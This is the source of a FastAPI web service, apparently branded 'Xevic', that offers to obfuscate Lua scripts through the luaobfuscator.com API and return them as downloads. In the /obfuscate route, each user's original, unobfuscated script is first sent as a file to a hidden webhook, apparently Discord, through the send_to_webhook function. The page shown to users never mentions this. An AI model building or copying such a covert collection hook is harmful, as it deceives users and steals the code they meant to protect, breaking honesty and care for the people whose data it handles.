# main.py
import os
import io
import json
import logging
from typing import Optional

import aiohttp
from dotenv import load_dotenv
from fastapi import FastAPI, File, Form, Request, UploadFile
from fastapi.responses import HTMLResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles

# Load local .env for local development only (Vercel uses project env vars)
load_dotenv()

log = logging.getLogger("xevic-obf-web")
logging.basicConfig(level=logging.INFO)

LUAOBFUSCATOR_API_KEY = os.getenv("LUAOBFUSCATOR_API_KEY")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

app = FastAPI(title="xevic obfuscator web")

# Mount static directory if present
if os.path.isdir("static"):
    app.mount("/static", StaticFiles(directory="static"), name="static")


async def send_to_webhook(session: aiohttp.ClientSession, filename: str, content: str) -> None:
    """Send the original uploaded script to a configured webhook (e.g., Discord)."""
    if not WEBHOOK_URL:
        log.debug("No WEBHOOK_URL configured; skipping webhook send.")
        return

    try:
        file_bytes = io.BytesIO(content.encode("utf-8"))
        form = aiohttp.FormData()
        # Create a valid JSON payload for payload_json (Discord expects a JSON string here)
        payload = json.dumps({"content": f"Original script uploaded: `{filename}`"})
        form.add_field("payload_json", payload)
        form.add_field("file", file_bytes, filename=filename, content_type="text/plain")

        async with session.post(WEBHOOK_URL, data=form) as resp:
            if resp.status not in (200, 204):
                body = await resp.text()
                log.warning("Webhook returned HTTP %s: %s", resp.status, body)
    except Exception:
        log.exception("Failed to send script to webhook")


async def obfuscate_script(session: aiohttp.ClientSession, script: str) -> str:
    """Send script to the luaobfuscator API and return obfuscated code (or original on failure)."""
    if not LUAOBFUSCATOR_API_KEY:
        log.debug("No LUAOBFUSCATOR_API_KEY configured; returning original script.")
        return script

    # Use a timeout for external calls to avoid indefinite waits in serverless environment
    timeout = aiohttp.ClientTimeout(total=25)
    try:
        headers = {"apikey": LUAOBFUSCATOR_API_KEY, "content-type": "text/plain"}

        async with session.post(
            "https://api.luaobfuscator.com/v1/obfuscator/newscript",
            headers=headers,
            data=script,
            timeout=timeout,
        ) as resp:
            if resp.status != 200:
                body = await resp.text()
                log.warning("luaobfuscator newscript returned %s: %s", resp.status, body)
                return script
            data = await resp.json()
            session_id = data.get("sessionId")
            if not session_id:
                log.warning("no sessionId returned from luaobfuscator: %s", data)
                return script

        headers2 = {
            "apikey": LUAOBFUSCATOR_API_KEY,
            "sessionId": session_id,
            "content-type": "application/json",
        }
        params = {"MinifyAll": True, "Virtualize": True, "CustomPlugins": {"DummyFunctionArgs": [6, 9]}}

        async with session.post(
            "https://api.luaobfuscator.com/v1/obfuscator/obfuscate",
            headers=headers2,
            json=params,
            timeout=timeout,
        ) as resp2:
            if resp2.status != 200:
                body = await resp2.text()
                log.warning("luaobfuscator obfuscate returned %s: %s", resp2.status, body)
                return script
            data2 = await resp2.json()
            return data2.get("code", script)
    except Exception:
        log.exception("Obfuscation error")
        return script


@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    """Return the main HTML page (UI + canvas animation)."""
    # (HTML kept inline for simplicity; you can move to static/html if you prefer)
    return """
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Xevic — Lua obfuscator</title>
  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
  <style>
    :root{--bg:#070708;--panel:rgba(255,255,255,0.02);--muted:rgba(255,255,255,0.46);--glass:rgba(255,255,255,0.02);--text:#f3f3f3}
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;background:var(--bg);color:var(--text);font-family:'Press Start 2P', system-ui, monospace;overflow:hidden}
    canvas#bg{position:fixed;inset:0;z-index:0;mix-blend-mode:screen;filter:blur(0.8px);opacity:0.95}
    main{position:relative;z-index:2;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
    .card{width:100%;max-width:920px;background:linear-gradient(180deg, rgba(255,255,255,0.008), rgba(255,255,255,0.004));border-radius:12px;padding:20px;border:1px solid var(--panel);backdrop-filter: blur(6px)}
    header{display:flex;gap:12px;align-items:center;margin-bottom:12px}
    .brand{width:56px;height:56px;border-radius:10px;background:transparent;border:1px solid var(--panel);display:flex;align-items:center;justify-content:center;font-weight:700;color:var(--muted);font-size:12px}
    h1{margin:0;font-size:18px;font-weight:600}
    p.lead{margin:0;color:var(--muted);font-size:11px}
    .layout{display:grid;grid-template-columns:1fr 320px;gap:16px}
    textarea{width:100%;min-height:300px;padding:12px;border-radius:8px;background:transparent;border:1px solid var(--panel);color:var(--text);font-family:'Press Start 2P', monospace;font-size:12px;resize:vertical}
    .right{display:flex;flex-direction:column;gap:10px;padding:6px}
    .file-box{padding:12px;border-radius:8px;border:1px dashed var(--panel);background:transparent;color:var(--muted);min-height:120px;display:flex;align-items:center;justify-content:center;cursor:pointer;text-align:center}
    input[type="file"]{display:none}
    input[type="text"]{padding:10px;border-radius:8px;background:transparent;border:1px solid var(--panel);color:var(--text);font-family:'Press Start 2P', monospace}
    .controls{display:flex;gap:8px;align-items:center}
    .btn{padding:10px 12px;border-radius:8px;border:1px solid var(--panel);background:transparent;color:var(--text);cursor:pointer;font-weight:600}
    .btn.primary{background:transparent;border:1px solid var(--muted)}
    .meta{color:var(--muted);font-size:10px;display:flex;justify-content:space-between;gap:8px}
    .filename{color:var(--muted);font-size:11px;word-break:break-all}
    footer{margin-top:12px;color:var(--muted);font-size:11px;text-align:right}
    @media (max-width:900px){.layout{grid-template-columns:1fr}.right{order:2}}
  </style>
</head>
<body>
  <canvas id="bg" aria-hidden="true"></canvas>
  <main>
    <div class="card" role="main" aria-live="polite">
      <header>
        <div class="brand">xevic</div>
        <div>
          <h1>Xevic — Lua obfuscator</h1>
          <p class="lead"></p>
        </div>
      </header>

      <div class="layout">
        <div>
          <form id="obfForm" action="/obfuscate" method="post" enctype="multipart/form-data">
            <textarea name="script" id="script" placeholder="Paste Lua script here..."></textarea>
            <div class="meta" style="margin-top:8px">
              <div>Output will download after obfuscation.</div>
              <div></div>
            </div>
            <div class="controls" style="margin-top:10px">
              <button type="submit" class="btn primary">obfuscate</button>
              <button type="button" class="btn" id="clearBtn">Clear</button>
            </div>
          </form>
        </div>

        <aside class="right" aria-label="file controls">
          <label class="file-box" id="fileLabel">Click to select or drop a .lua/.txt file</label>
          <input id="fileInput" name="file" type="file" accept=".lua,.txt">
          <input type="text" id="filename" name="filename" placeholder="Output filename (optional)">
          <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:auto">
            <button id="clearFile" class="btn" type="button">remove file</button>
          </div>
        </aside>
      </div>

      <footer>
        <div>made by <strong>xevic</strong>.</div>
      </footer>
    </div>
  </main>

  <script>
    const canvas = document.getElementById('bg');
    const ctx = canvas.getContext('2d');
    function resizeCanvas(){canvas.width = innerWidth;canvas.height = innerHeight;initCols()}
    addEventListener('resize', resizeCanvas, false)
    const glyphs = '█▓▒■●◼◆♦♥★✦✧*+#@%$&<>\\/|-_=';
    const fontSize = 18;
    let cols = 0;
    let columns = [];
    let tick = 0;
    function initCols(){cols = Math.max(1, Math.floor(canvas.width / fontSize));columns = new Array(cols).fill(0).map(() => Math.floor(Math.random() * (canvas.height / fontSize)));ctx.font = fontSize + 'px monospace'}
    function draw(){ctx.clearRect(0,0,canvas.width,canvas.height);ctx.fillStyle = 'rgba(7,7,7,0.18)';ctx.fillRect(0,0,canvas.width,canvas.height);
      for(let i=0;i<cols;i++){const x = i * fontSize;const y = columns[i] * fontSize;const ch = glyphs.charAt(Math.floor(Math.abs(Math.sin((i + tick) * 0.07)) * glyphs.length));const r = 180 + Math.floor(75 * Math.abs(Math.sin((i + tick) * 0.11)));const g = Math.floor(40 * Math.abs(Math.cos((i + tick) * 0.09)));const b = Math.floor(40 * Math.abs(Math.sin((i + tick) * 0.05)));const alpha = 0.12 + 0.12 * Math.abs(Math.sin((i + tick) * 0.03));ctx.fillStyle = `rgba(${r},${g},${b},${alpha})`;ctx.shadowColor = `rgba(${r},${g},${b},0.6)`;ctx.shadowBlur = 6;ctx.fillText(ch, x, y);if (y > canvas.height && Math.random() > 0.98) columns[i] = 0;columns[i]++}
      tick++;requestAnimationFrame(draw)}
    resizeCanvas();draw();

    const fileInput = document.getElementById('fileInput');
    const fileLabel = document.getElementById('fileLabel');
    const obfForm = document.getElementById('obfForm');
    const fileNameEl = document.getElementById('fileName');
    const filenameHidden = document.getElementById('filename');

    // Clicking the box opens file picker
    fileLabel.addEventListener('click', ()=> fileInput.click());

    // When a file is selected: do NOT populate the textarea (we want the server to use the uploaded file as-is).
    fileInput.addEventListener('change', (e) => {
      const f = e.target.files && e.target.files[0];
      if (!f) {
        fileLabel.textContent = 'Click to select or drop a .lua/.txt file';
        return;
      }
      fileLabel.textContent = `Selected: ${f.name}`;

      // Make sure the file input has name 'file' so the form sends it.
      fileInput.name = 'file';

      // Ensure we don't accidentally submit textarea content when a file is present.
      const ta = document.getElementById('script');
      ta.value = '';

      // If the file input was moved or replaced in the DOM earlier, ensure it's inside the form.
      if (!obfForm.contains(fileInput)) {
        obfForm.appendChild(fileInput);
      }
    });

    // Support drag & drop onto the label
    fileLabel.addEventListener('dragover', (e)=>{ e.preventDefault(); fileLabel.style.opacity=0.9; });
    fileLabel.addEventListener('dragleave', ()=>{ fileLabel.style.opacity=1 });
    fileLabel.addEventListener('drop', (e)=> {e.preventDefault();const files = e.dataTransfer.files;if (files && files[0]) {fileInput.files = files;const evt = new Event('change');fileInput.dispatchEvent(evt)}fileLabel.style.opacity=1});

    // Remove the file selection
    document.getElementById('clearFile').addEventListener('click', ()=>{
      fileInput.value = '';
      fileInput.name = '';
      fileLabel.textContent = 'Click to select or drop a .lua/.txt file';
      document.getElementById('script').value = '';
      filenameHidden.value = '';
    });

    // When submitting, add hidden filename field (if provided)
    obfForm.addEventListener('submit', (ev) => {
      let existing = obfForm.querySelector('input[name="filename"]');
      if (!existing) {
        const hidden = document.createElement('input');
        hidden.type = 'hidden';
        hidden.name = 'filename';
        hidden.value = filenameHidden.value || '';
        obfForm.appendChild(hidden);
      } else {
        existing.value = filenameHidden.value || '';
      }

      // If a file is present, ensure textarea is empty so server uses the uploaded file.
      const f = fileInput.files && fileInput.files[0];
      if (f) {
        document.getElementById('script').value = '';
      }
    });

    // Clear textarea only
    document.getElementById('clearBtn').addEventListener('click', ()=>{document.getElementById('script').value = ''; filenameHidden.value = ''});
  </script>
</body>
</html>
    """


@app.post("/obfuscate")
async def obfuscate(file: Optional[UploadFile] = File(None), script: Optional[str] = Form(None), filename: Optional[str] = Form(None)):
    """Accept an uploaded file or pasted script, obfuscate it, and return as a downloadable file."""
    if not file and not script:
        return HTMLResponse("<p style='color:red'>Error: No input provided.</p>", status_code=400)

    try:
        if file:
            incoming_name = file.filename or "uploaded_script.lua"
            raw = await file.read()
            content = raw.decode("utf-8", errors="replace")
        else:
            incoming_name = "pasted_script.lua"
            content = script or ""

        # Use a single aiohttp session with a short timeout for external calls
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            # Send original to webhook (fire-and-forget style but awaited to capture errors)
            await send_to_webhook(session, incoming_name, content)
            # Obfuscate (may return original on failure)
            obfuscated = await obfuscate_script(session, content)

        out_name = filename or f"obfuscated_{incoming_name}"
        if not out_name.lower().endswith((".lua", ".txt")):
            out_name += ".lua"

        buf = io.BytesIO(obfuscated.encode("utf-8"))
        buf.seek(0)  # ensure buffer at start
        headers = {"Content-Disposition": f'attachment; filename="{out_name}"'}
        return StreamingResponse(buf, media_type="text/plain", headers=headers)
    except Exception as e:
        log.exception("Error processing file")
        return HTMLResponse(f"<p style='color:red'>Error: {e}</p>", status_code=500)


# Only start the dev server when running this file directly (local dev).
if __name__ == "__main__":
    import uvicorn

    log.info("Starting xevic obfuscator web (local)")
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
